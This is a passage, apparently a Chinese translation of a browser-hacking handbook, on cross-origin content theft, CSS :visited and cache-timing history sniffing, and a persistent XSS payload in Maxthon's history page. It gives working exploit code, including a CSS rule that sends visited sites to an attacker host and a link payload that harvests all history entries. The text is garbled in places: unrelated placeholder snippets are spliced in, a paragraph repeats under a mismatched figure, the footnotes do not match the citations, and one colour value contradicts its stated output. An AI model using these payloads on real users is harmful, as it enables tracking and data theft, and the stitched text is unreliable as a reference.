
此技术可以实现跨源内容提取，从而有效绕过同源策略（SOP）。值得注意的是，2011 年 10 月，该技术在野外被用于攻击 Facebook。39

另一种跨源内容提取方法是 Luca De Fulgentis 研发的 IFrame 到 IFrame 拖放技术。40 该技术与前面的拖放/查看源代码 PoC 高度相似，主要区别在于目标会将目标 IFrame 拖放到另一个 IFrame 中，而不是到顶层窗口。

在本次攻击中，你控制拖放目的 IFrame。当内容被拖放到你的 IFrame 时，Firefox 会将信息回传给你，即使是跨源的。这是因为代码库中未实现 IFrame 之间的拖放操作的跨源检查。在他的原始披露中，De Fulgentis 展示了如何通过窃取反 XSRF token 来针对 LinkedIn 用户，然后在目标用户的个人资料中添加任意电子邮件地址。

De Fulgentis 的技术再次明确表明，拖放操作缺乏同源策略（SOP）的执行。

### 利用浏览器历史记录

浏览器历史记录攻击会暴露其他来源的信息，让你能够判断浏览器（以及当然，用户）访问过哪些来源。

过去，一种有效的浏览器历史记录攻击是直接检查写入页面的链接颜色。你将简要探索使用 CSS 颜色的方法，但请记住现代浏览器已经为这种攻击进行了修补。

你还将探索基于时间（timing）的攻击方法。这些方法目前是最有效的，可以在多种浏览器中暴露浏览器历史记录信息。

还有其他一些特例，它们依赖于浏览器本身暴露的特定 API。本文将探讨一些较少人知的浏览器，如 Avant 和 Maxthon 浏览器，它们也容易受到这些历史窃取漏洞的影响。

#### 使用 CSS 颜色

在‘过去的美好时代’，可以通过 CSS 信息窃取浏览器历史记录。这主要是通过滥用 `:visited` CSS 选择器实现的。下面的技术（在 Full Disclosure41 中于 2002 年讨论）虽然简单，却非常有效。考虑以下链接：

```
<a id="site_1" href="http://browservictim.com">link</a>
```

CSS 选择器可以用来检查目标是否访问了前一个链接，从而判断它是否在浏览器历史记录中：

```
#site_1:visited { 
background: url(/browserhacker.com?site=browservictim); 
}
```

在此例中，背景选择器用于检查，但你可以使用任何可以指定 URI 的选择器。如果 `browservictim.com` 正好在浏览器历史记录中，那么会向 `browserhacker.com?site=browservictim` 发出一次 GET 请求。

Jeremiah Grossman 在 2006 年披露了类似技术，该技术依赖于检查链接元素的颜色。在大多数浏览器中，未访问过的链接默认显示为蓝色，已访问过的链接则显示为紫色。Grossman 的原始概念证明（PoC）42 中，将已访问过的链接样式覆盖为自定义样式（例如红色）。随后使用脚本动态生成页面上的链接（可能隐藏在用户视野之外），并与之前覆盖的红色样式进行比较。如果颜色匹配，则说明该站点已在浏览器历史记录中。下面是一个示例：

```
<html>
<head>
<style>
#link:visited {color: #Fc00f000;}
</style>
</head>
<body>
<a id="link" href="http://browserhacker.com" 
target="_blank">clickme</a>
<script>
var link = document.getElementById("link"); 
var color = document.defaultView.getComputedStyle(link,
 null).getPropertyValue("color");
console.log(color);
</script>
</body>
</html>
```

如果链接之前已被访问，且浏览器对该攻击保持脆弱，控制台输出会是 `rgb(255, 0, 0)`，对应 CSS 中覆盖的红色。若在最新的 Firefox（已修复该漏洞）中运行该片段，结果始终为 `rgb(0, 0, 238)`。

如今，大多数现代浏览器已经修补此行为。例如，Firefox 在 2010 年进行了修补。43

#### 使用缓存时间（Timing）

Felten 和 Schneider44 在 2000 年发表了《Timing Attacks on Web Privacy》一文，最早公开的关于缓存时间攻击的研究之一。该论文主要关注测量资源在有或没有浏览器缓存的情况下的访问时间，从而判断资源是否已经被缓存。该方法的局限之一是，在初始测试时查询浏览器缓存会对缓存状态产生污染。

Michal Zalewski45 则提出了一种非破坏性的浏览器历史记录提取技术，采用类似的缓存时间方法。截至本文写作时，该技术仍然在现代浏览器上有效。

Zalewski 的方法是通过在 IFrames 中加载资源、捕获同源策略（SOP）违规并阻止缓存修改来实现。IFrames 之所以适合此目的，是因为 SOP 强制执行，且可以阻止 IFrame 完全加载资源，从而避免本地缓存被修改。通过使用短时的加载和卸载操作，缓存保持不变。一旦确认某资源出现缓存不命中，则停止 IFrame 的加载。这样可以在稍后再次测试同一资源。

此技术最有效的目标资源是 CSS 或 JavaScript 文件，因为它们常被浏览器缓存，并且在访问目标网站时总是会被加载。需要注意的问题是，这些资源会在 IFrame 中加载，因此不应包含任何防止嵌入的逻辑（如 `X-Frame-Options`，除了 Allow 之外）。

下图 Figure 4-22 展示了该攻击的输出结果。在此例中，判断出用户访问了 [AboveTopSecret.com](http://AboveTopSecret.com) 和 [Wikileaks.org](http://Wikileaks.org)。

start figure 

**图 4-22：** 使用缓存时间进行浏览器历史记录提取

![c04f022.eps](img/c04f022.png)

end figure 

在浏览上述两个网站时，通常会加载以下两个资源：

```
http://wikileaks.org/squelettes/random.js 
http://www.abovetopsecret.com/forum/ats-scripts.js
```

该技术的核心代码片段如下：

```
function wait_for_noread() {

  try {

    /*

     * 这是 SOP 违规发生的位置，因为我们正在读取加载到 IFrame 中的跨域资源的 `location.href` 属性。

     */

    if (frames['f'].location.href == undefined) throw 1;

    /*

     * 在 TIME_LIMIT 未到达之前，持续尝试读取 IFrame 中的 `location.href`。否则调用 `maybe_test_next()`，它会将 IFrame 的 src 重置为 about:blank，防止完整资源加载和缓存修改。

     * 然后继续处理下一个资源。

     */

    if (cycles++ >= TIME_LIMIT) {

      maybe_test_next();

      return;

    }

    setTimeout(wait_for_noread, 1);

  } catch (e) {

    /*

     * 捕获到 SOP 违规，确认被检查的资源已缓存。

     */

    confirmed_visited = true;

    maybe_test_next();

  }

}
```

当 SOP 违规在特定超时之前被捕获，意味着缓存命中。这说明资源已缓存，从而可以推断用户已经访问过加载该资源的网站。Figure 4-23 演示了这种行为。

start figure 

**Figure 4-23:** SOP 违规错误

![c04f023.tif](img/c04f023.png)

end figure 

你可以在 [`browserhacker.com`](https://browserhacker.com) 网站或维基网站 [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook) 查看该技术的完整源码，原始的三个 PoC 已被修改并合并为一个代码片段。

当 SOP 违规在特定超时之前被捕获，意味着缓存命中。这说明资源已缓存，从而可以推断用户已经访问过加载该资源的网站。Figure 4-23 演示了这种行为。

start figure 

**Figure 4-24:** 调用专有的 `AFRunCommand` 函数

![c04f024.tif](img/c04f024.png)

end figure 

类似的漏洞也被发现于 Maxthon 3.4.5 build 2000。Maxthon 是另一款浏览器，和 Avant 类似，它会向 web 页面暴露非标准 API 以访问文件并甚至启动可执行文件。

Roberto Suggi Liverani 发现 47，`about:history` 页面的渲染内容缺乏有效的输出转义，这会导致可利用的条件。如果你诱导目标打开以下链接，恶意注入将在历史记录页面持久存在：

```
http://172.16.37.1/malicious.html#" onload='alert(1)'<!—
```

`onload` 属性中的代码会每次目标检查浏览器历史时执行。这里的有趣之处是，恶意 JavaScript 代码会在特权上下文中执行。`about:history` 页面恰好映射到自定义 Maxthon 资源 `mx://res/history/index.htm`，将代码注入该上下文可以窃取所有历史记录内容。例如，下面的代码解析历史记录列表中的所有链接：

```
links = document.getElementById('history-list')
.getElementsByTagName('a');
result = "";
for(var i=0; i<links.length; i++) {
  if(links[i].target == "_blank"){
       result += links[i].href+"\n";
  }
}
alert(result);
```

此负载可以通过以下链接包装并递交：

```
http://172.16.37.1/malicious.html#" onload='links=document.
getElementById("history-list").getElementsByTagName("a"); 
result="";for(i=0;i<links.length;i++){if(links[i].target=="_blank"
{result+=links[i].href+"\n";}}alert(result);'<!--
```

需要注意的是，这种跨内容脚本（Cross-content Scripting）漏洞在后续第 7 章中进一步探讨，并且是持久化的。第一次加载恶意内容到历史记录页面后，代码会在用户每次查看历史记录时执行。当用户打开浏览器历史记录页面时，结果类似于 Figure 4-25。

start figure 

**Figure 4-25:** 注入的恶意代码作为链接被执行。

![c04f025.tif](img/c04f025.png)

end figure 

要发动真正的攻击，需要将 `alert()` 函数替换为第 3 章讨论的钩子技术之一，这样就可以将窃取的浏览器历史发送回收集服务器。

进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```

18. Michael Coates. (2012). Firefox 16 的安全漏洞。检索于 2013 年 5 月 11 日 [`blog.mozilla.org/security/2012/10/10/security-vulnerability-in-firefox-16/`](https://blog.mozilla.org/security/2012/10/10/security-vulnerability-in-firefox-16/)

19. Opera Software. (2012). Opera 12.10 更新日志。检索于 2013 年 5 月 11 日 from [`www.opera.com/docs/changelogs/unified/1210/`](http://www.opera.com/docs/changelogs/unified/1210/)

20. Gareth Heyes. (2012). 提示：跨域访问对象构造器可以用于促进跨站脚本攻击。检索于 2013 年 5 月 11 日 from [`www.opera.com/support/kb/view/1032/`](http://www.opera.com/support/kb/view/1032/)

21. Gareth Heyes. (2012). Opera 跨域与视频教程。检索于 2013 年 5 月 11 日 from [`www.thespanner.co.uk/2012/11/08/opera-x-domain-with-video-tutorial/`](http://www.thespanner.co.uk/2012/11/08/opera-x-domain-with-video-tutorial/)

22. Roi Saltzman. (2012). DropBox 跨区域脚本攻击。检索于 2013 年 5 月 11 日 from [`blog.watchfire.com/files/dropboxadvisory.pdf`](http://blog.watchfire.com/files/dropboxadvisory.pdf)

23. Roi Saltzman. (2012). Google Drive 跨区域脚本攻击。检索于 2013 年 5 月 11 日 from [`blog.watchfire.com/files/googledriveadvisory.pdf`](http://blog.watchfire.com/files/googledriveadvisory.pdf)

24. Veracode. (2012). 前 100 万个网站的安全头信息。检索于 2013 年 5 月 11 日 from [`www.veracode.com/blog/2012/11/security-headers-report/`](http://www.veracode.com/blog/2012/11/security-headers-report/)

25. Anton Rager. (2002). 高级跨站脚本攻击（Evil XSS）。检索于 2013 年 5 月 11 日 from [`xss-proxy.sourceforge.net/shmoocon-XSS-Proxy.ppt`](http://xss-proxy.sourceforge.net/shmoocon-XSS-Proxy.ppt)

26. Stefano Di Paola and Giorgio Fedon. (2006). 伪造 Ajax。检索于 2013 年 5 月 11 日 from [`events.ccc.de/congress/2006/Fahrplan/attachments/1158-Subverting_Ajax.pdf`](http://events.ccc.de/congress/2006/Fahrplan/attachments/1158-Subverting_Ajax.pdf)

27. Ferruh Mavituna. (2007). XSS 隧道。检索于 2013 年 5 月 11 日 from [`labs.portcullis.co.uk/download/XSS-Tunnelling.pdf`](http://labs.portcullis.co.uk/download/XSS-Tunnelling.pdf)

28. Krzysztof Kotowicz. (2009). 野外中的新 Facebook 点击劫持攻击。检索于 2013 年 5 月 11 日 from [`blog.kotowicz.net/2009/12/new-facebook-clickjagging-attack-in.html`](http://blog.kotowicz.net/2009/12/new-facebook-clickjagging-attack-in.html)

29. Jesse Ruderman. (2002). 如果 rame 内容默认背景为透明。检索于 2013 年 5 月 11 日 from [`bugzilla.mozilla.org/show_bug.cgi?id=154957`](https://bugzilla.mozilla.org/show_bug.cgi?id=154957)

30. Robert Hansen and Jeremiah Grossman. (2008). 点击劫持。检索于 2013 年 5 月 11 日 from [`www.sectheory.com/clickjacking.htm`](http://www.sectheory.com/clickjacking.htm)
